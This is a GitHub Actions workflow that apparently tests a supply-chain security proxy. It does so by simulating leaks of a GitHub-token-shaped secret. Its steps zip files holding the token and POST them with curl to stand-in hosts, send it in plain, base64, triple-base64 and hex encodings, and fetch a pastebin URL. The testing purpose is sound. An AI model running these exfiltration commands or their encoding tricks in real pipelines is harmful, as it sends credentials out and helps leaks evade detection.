name: Install NPM Packages

on:
  workflow_dispatch:

permissions:
  checks: write
  contents: write
  packages: read

jobs:
  install-deps:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        
      - name: Setup PSE
        uses: invisirisk/pse-action@latest
        with:
          api_url: "https://app.stage.invisirisk.com"
          app_token: ${{ secrets.IR_API_KEY }}
          mode: "docker-intercept"
          debug: true
          
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20' # or use your project's Node version


      - name: ðŸ“ Create and Compress the File
        run: |
          # 1. Create a dummy file for the mock
          echo "-d '{"data":{"GH":"ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"}}'" > dummy_file.txt
          
          # 2. Create the leaks.zip file in the working directory
          zip leaks.zip dummy_file.txt
          
      - name: ðŸ“ Create and Compress the File With base64 secrets
        run: |
          # 1. Create a dummy file for the mock
          echo "-d '{"data":{"GH":"WjJod1gwUkZSbnB0WnpkU1NISlJNbVZOWlRKSlJqUk9lRTVYVVc5a1dYQmhZak5XVFZoWVdBPT0="}}'" > dummy_file_64.txt
          
          # 2. Create the leaks.zip file in the working directory
          zip leaks64.zip dummy_file_64.txt
          
      - name: ðŸš€ Upload the generated Zip File
        run: |
          # Since the 'zip' command ran in the root directory, 
          # the path is simply 'leaks.zip'
          curl -X POST https://examples.com \
            -F "file=@leaks.zip" \
            -H "Content-Type: application/form-data"
            
      - name: ðŸš€ Upload the generated Zip File base64
        run: |
          # Since the 'zip' command ran in the root directory, 
          # the path is simply 'leaks.zip'
          curl -X POST https://archivedSecretsbase64.com \
            -F "file=@leaks64.zip" \
            -H "Content-Type: application/form-data"
            
      - name: Mock API key exposure request (Normal)
        run: |
          curl -X POST https://normalsecrets.com \
          -H "Content-Type: application/json" \
          -d '{"data":{"GH":"ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"}}'

      - name: Mock API key exposure request (HEX to BASE64)
        run: |
          curl -X POST https://HEXtoBase64.com \
          -H "Content-Type: application/json" \
          -d '{"data":{"GH":"Njc2ODcwNWY0NDQ1NDY3YTZkNjczNzUyNDg3MjUxMzI2NTRkNjUzMjQ5NDYzNDRlNzg0ZTU3NTE2ZjY0NTk3MDYxNjIzMzU2NGQ1ODU4NTg="}}'

      - name: Mock API key exposure request (HEX to BASE64 to HEX)
        run: |
          curl -X POST https://HEXtoBase64toHEX.com \
          -H "Content-Type: application/json" \
          -d '{"data":{"GH":"4e6a63324f4463774e5759304e4451314e44593359545a6b4e6a637a4e7a55794e4467334d6a55784d7a49324e54526b4e6a557a4d6a51354e44597a4e44526c4e7a67305a5455334e5445325a6a59304e546b334d4459784e6a497a4d7a55324e4751314f4455344e54673d"}}'
          
      - name: 3 level base64 encoding secrets
        run: |
          curl -X POST https://base64encodedsecrets.com \
          -H "Content-Type: application/json" \
          -d '{"data":{"GH":"V2pKb2QxZ3dVa1pTYm5CMFducGtVMU5JU2xKTmJWWk9XbFJLU2xKcVVrOWxSVFZZVlZjNWExZFlRbWhaYWs1WFZGWm9XVmRCUFQwPQ=="}}'
          
      - name: hex encoded
        run: |
          curl -X POST https://hexencodedsecrets.com \
          -H "Content-Type: application/json" \
          -d '{"data":{"GH":"6768705f4445467a6d67375248725132654d65324946344e784e57516f645970616233564d585858"}}'
          
      - name: secrets on response
        run: |
          curl -k https://pastebin.com/raw/V4FrgKcm

      - name: non web request body
        run: |
          curl -X POST https://repo1.maven.org/maven2/org/apache/commons/commons-lang3/3.12.0/commons-lang3-3.12.0.jar \
          -H "Content-Type: application/json" \
          -d '{"data":{"GH":"V2pKb2QxZ3dVa1pTYm5CMFducGtVMU5JU2xKTmJWWk9XbFJLU2xKcVVrOWxSVFZZVlZjNWExZFlRbWhaYWs1WFZGWm9XVmRCUFQwPQ=="}}'


      - name: Install dependencies
        run: npm install --legacy-peer-deps --force
         
      - name: Count total installed NPM packages
        run: |
          COUNT=$(npm ls --all --parseable --long 2>/dev/null | grep node_modules | wc -l)
          echo "Total packages installed (including transitive): $COUNT"

      - name: Cleanup PSE
        if: always()
        uses: invisirisk/pse-action@latest
        with:
          cleanup: "true"
          
  gather_analytics:
      
   runs-on: ubuntu-latest
   name: Gather Analytics
   needs: install-deps
   if: always()
   steps:
   - name: Gather Status
     uses: invisirisk/pse-action@latest
     with:
      api_url: "https://app.stage.invisirisk.com"
      app_token: ${{ secrets.IR_API_KEY }}
      send_job_status: "true"
      debug: "true"
